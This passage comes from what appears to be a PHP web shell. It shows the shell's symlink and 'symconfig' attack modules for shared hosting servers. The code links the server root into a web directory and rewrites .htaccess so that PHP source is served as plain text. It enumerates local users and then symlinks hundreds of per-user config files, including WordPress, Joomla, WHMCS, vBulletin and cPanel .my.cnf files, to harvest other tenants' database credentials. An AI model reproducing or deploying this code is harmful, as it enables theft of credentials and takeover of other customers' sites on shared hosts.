     if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
     continue;
     echo "<tr><td align=center><font size=2>" . $dcount . "</td>
     <td align=center><font class=txt>" . $matches . "</td>";
     echo "<td align=center><font class=txt><a href=$full/pain_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
     $dcount++;}fclose($file);
     echo "</table>";}else{if($os != "Windows"){@mkdir("pain_sym",0777);@chdir("pain_sym");@exe("ln -s / root");$file3 = '
     Options Indexes FollowSymLinks
    DirectoryIndex pain.htm
    AddType text/plain .php
    AddHandler text/plain .php
    Satisfy Any
    ';
     $fp3 = fopen('.htaccess','w');
     $fw3 = fwrite($fp3,$file3);@fclose($fp3);
     echo "
     <div class='mybox'>
     <table align=center border=1><tr>
     <td align=center><font size=3>ID</font></td>
     <td align=center><font size=3>Users</font></td>
     <td align=center><font size=3>Symlink</font></td></tr>";
     $temp = "";$val1 = 0;$val2 = 1000;
     for(;$val1 <= $val2;$val1++) {$uid = @posix_getpwuid($val1);
     if ($uid)$temp .= join(':',$uid)."\n";}
     echo '<br/>';$temp = trim($temp);$file5 =
     fopen("test.txt","w");
     fputs($file5,$temp);
     fclose($file5);$dcount = 1;$file =
     fopen("test.txt", "r") or exit("Unable to open file!");
     while(!feof($file)){$s = fgets($file);$matches = array();
     $t = preg_match('/\/(.*?)\:\//s', $s, $matches);$matches = str_replace("home/","",$matches[1]);
     if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
     continue;
     echo "<tr><td align=center><font size=2>" . $dcount . "</td>
     <td align=center><font class=txt>" . $matches . "</td>";
     echo "<td align=center><font class=txt><a href=$full/pain_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
     $dcount++;}
     fclose($file);
     echo "</table></div></center>";unlink("test.txt");
     } else
     echo "<center><font size=3>Cannot create Symlink</font></center>";
     }
     }
    
    }
    elseif($_GET['do'] == 'symconfig') {
    if(strtolower(substr(PHP_OS, 0, 3)) == "win"){
    echo '<script>alert("Skid this won\'t work on Windows")</script>';
    exit;
    }
    else
    {
    if($_POST["m"] && !$_POST["passwd"]==""){
    @mkdir("pain_symconf", 0777);
    @chdir("pain_symconf");
    @symlink("/","root");
    $htaccess="Options Indexes FollowSymLinks
    DirectoryIndex painisjustice.htm
    AddType text/plain .php 
    AddHandler text/plain .php
    Satisfy Any";
    @file_put_contents(".htaccess",$htaccess);
    $etc_passwd=$_POST["passwd"];
    $etc_passwd=explode("\n",$etc_passwd);
    foreach($etc_passwd as $passwd){
    $pawd=explode(":",$passwd);
    $user =$pawd[0];
    
    @symlink('/','pain_symconf/root');
    @symlink('/home/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
    @symlink('/home/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
    @symlink('/home/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
    @symlink('/home/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
    @symlink('/home/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
    @symlink('/home/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
    @symlink('/home/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
    @symlink('/home/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
    @symlink('/home/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
    @symlink('/home/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
    @symlink('/home/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
    @symlink('/home/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
    @symlink('/home/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
    @symlink('/home/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
    @symlink('/home/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
    @symlink('/home/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
    @symlink('/home/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
    @symlink('/home/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');
    
    //Home1
    
    @symlink('/home1/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home1/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home1/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home1/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home1/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home1/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
    @symlink('/home1/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home1/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home1/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home1/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home1/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home1/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home1/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
    @symlink('/home1/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home1/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home1/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home1/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home1/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home1/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home1/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home1/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home1/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home1/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home1/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home1/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home1/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home1/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home1/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home1/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home1/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home1/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home1/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
    @symlink('/home1/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
    @symlink('/home1/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
    @symlink('/home1/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
    @symlink('/home1/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
    @symlink('/home1/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
    @symlink('/home1/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
    @symlink('/home1/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
    @symlink('/home1/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
    @symlink('/home1/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
    @symlink('/home1/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
    @symlink('/home1/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
    @symlink('/home1/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
    @symlink('/home1/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
    @symlink('/home1/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home1/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
